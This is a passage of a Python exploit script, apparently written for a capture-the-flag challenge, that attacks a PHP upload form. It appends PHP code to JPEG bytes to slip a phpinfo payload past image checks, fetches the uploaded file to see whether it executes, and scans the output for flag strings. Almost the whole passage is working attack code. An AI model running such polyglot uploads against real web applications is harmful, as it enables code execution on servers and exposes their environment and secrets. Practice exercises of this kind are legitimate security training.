print(f"[+] Response: {response.text[:500]}")

flag_check = requests.get(f"{base_url}/upload/flag.jpg")
print(f"[+] Flag check: {flag_check.status_code}")
print(f"[+] Response: {flag_check.text}")

# Test 11: Show all environment variables
print("\n[*] TEST 11: Show all environment via phpinfo")
phpinfo_shell = jpeg_content + b'<?php phpinfo(); ?>'
files = {'userfile': ('info.jpg', phpinfo_shell, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

info_check = requests.get(f"{base_url}/upload/info.jpg")
print(f"[+] Info check: {info_check.status_code}")
# Look for FLAG in response
if 'FLAG' in info_check.text or 'flag' in info_check.text:
    print("[!] FLAG found in response!")
    # Extract FLAG
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', info_check.text)
    if flags:
        print(f"[!!!] FLAGS FOUND: {flags}")

